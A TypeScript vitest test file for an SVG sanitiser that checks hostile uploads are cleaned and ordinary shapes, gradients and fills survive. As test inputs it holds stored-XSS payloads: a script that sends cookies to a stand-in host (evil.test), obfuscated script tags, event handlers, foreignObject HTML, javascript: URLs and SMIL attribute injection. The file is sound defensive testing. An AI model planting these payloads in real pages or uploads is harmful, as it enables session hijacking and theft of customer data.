import { describe, expect, it } from "vitest";
import { looksLikeSvg, MAX_SVG_BYTES, sanitizeSvg } from "@/lib/media/svg";

/**
 * Commissioned by 06 §7.10 and 09 P06.
 *
 * The phase's first-draft verifier was "manual upload of a hostile .svg". A hostile-SVG
 * check that runs when someone remembers is not a control, so these are the automated
 * form. Each case is a real stored-XSS vector against an admin session that can issue
 * refunds and read every customer's address.
 */
const svg = (inner: string) =>
  Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">${inner}</svg>`);

const clean = (b: Buffer) => sanitizeSvg(b).svg.toString("utf8");

describe("hostile SVG", () => {
  it("strips <script>", () => {
    const out = clean(svg(`<script>fetch('https://evil.test?c='+document.cookie)</script>`));
    expect(out).not.toContain("script");
    expect(out).not.toContain("evil.test");
  });

  it("strips a nested/obfuscated script tag", () => {
    // The case a regex loses to: removing the inner `<script>` reassembles an outer one.
    const out = clean(svg(`<scr<script>ipt>alert(1)</scr</script>ipt>`));
    expect(out.toLowerCase()).not.toContain("<script");
  });

  it("strips on* event handlers, including ones no allowlist enumerates", () => {
    const out = clean(svg(`<circle r="5" onload="alert(1)" onmouseover="alert(2)" onanimationstart="alert(3)"/>`));
    expect(out).not.toMatch(/\son\w+=/i);
  });

  it("strips <foreignObject>, which wraps arbitrary HTML", () => {
    const out = clean(svg(`<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject>`));
    expect(out.toLowerCase()).not.toContain("foreignobject");
    expect(out).not.toContain("onerror");
  });

  it("strips <use> ENTIRELY, internal reference or not", () => {
    // 06 §7.10 forbids the tag outright rather than filtering its href, and that is the
    // stricter reading: `<use>` is the element whose whole purpose is to pull in another
    // subtree, and a same-document reference today is one `id` collision away from
    // pulling in something an editor pasted tomorrow. The href-fragment rule in the
    // attribute hook is the second line, covering every OTHER element that can carry one.
    expect(clean(svg(`<use href="https://evil.test/x.svg#p"/>`))).not.toContain("evil.test");
    expect(clean(svg(`<defs><circle id="c" r="5"/></defs><use href="#c"/>`))).not.toContain("<use");
  });

  it("keeps a same-document fragment on an element that is NOT <use>", () => {
    // A sanitiser that removes everything is easy and useless. `fill="url(#g)"` is the
    // ordinary way a gradient is applied and it must survive.
    const out = clean(
      svg(`<defs><linearGradient id="g"><stop offset="0" stop-color="#009C17"/></linearGradient></defs><rect fill="url(#g)" width="10" height="10"/>`),
    );
    expect(out).toContain("url(#g)");
  });

  it("strips xlink:href pointing off-document", () => {
    const out = clean(svg(`<use xlink:href="http://evil.test/x#y"/>`));
    expect(out).not.toContain("evil.test");
  });

  it("strips javascript: in a style url()", () => {
    const out = clean(svg(`<rect style="fill:url(javascript:alert(1))" width="10" height="10"/>`));
    expect(out).not.toContain("javascript:");
  });

  it("strips <image>, which is an outbound request at minimum", () => {
    const out = clean(svg(`<image href="https://evil.test/pixel.png"/>`));
    expect(out).not.toContain("evil.test");
  });

  it("strips SMIL animation that can set attributes after sanitisation", () => {
    const out = clean(svg(`<circle r="5"><set attributeName="onload" to="alert(1)"/></circle>`));
    expect(out).not.toContain("onload");
  });

  it("reports WHAT it removed — silent stripping teaches nobody", () => {
    const r = sanitizeSvg(svg(`<script>x</script><circle onload="y" r="5"/>`));
    expect(r.changed).toBe(true);
    expect(r.removed.length).toBeGreaterThan(0);
    expect(r.removed.join(" ")).toMatch(/script|onload/i);
  });
});

describe("benign SVG survives", () => {
  it("keeps shapes, paths, fills and viewBox", () => {
    const source = svg(`<path d="M0 0 L10 10" fill="#009C17" stroke-width="2"/>`);
    const r = sanitizeSvg(source);
    const out = r.svg.toString("utf8");
    expect(out).toContain("path");
    expect(out).toContain("#009C17");
    expect(out).toContain("M0 0 L10 10");
    // `removed` is the meaningful claim. `changed` is a byte comparison and is true for
    // harmless re-serialisation — DOMPurify writes `<path></path>` for `<path/>` — so
    // telling an uploader their file was altered on that basis would be useless.
    expect(r.removed).toEqual([]);
  });

  it("keeps gradients and filters — the SVG profile is not a shape-only profile", () => {
    const out = clean(
      svg(`<defs><linearGradient id="g"><stop offset="0" stop-color="#003D1F"/></linearGradient></defs><rect fill="url(#g)" width="10" height="10"/>`),
    );
    expect(out).toContain("linearGradient");
    expect(out).toContain("#003D1F");
  });
});

describe("structural guards", () => {
  it("recognises an SVG by its head, with or without an XML prologue", () => {
    expect(looksLikeSvg(svg("<circle r='5'/>"))).toBe(true);
    expect(looksLikeSvg(Buffer.from(`<?xml version="1.0"?><svg></svg>`))).toBe(true);
    expect(looksLikeSvg(Buffer.from("\x89PNG\r\n\x1a\n"))).toBe(false);
    expect(looksLikeSvg(Buffer.from("<html><body>hi</body></html>"))).toBe(false);
  });

  it("caps the size — a huge 'vector' is a raster in disguise or a decompression bomb", () => {
    expect(MAX_SVG_BYTES).toBe(256 * 1024);
  });
});
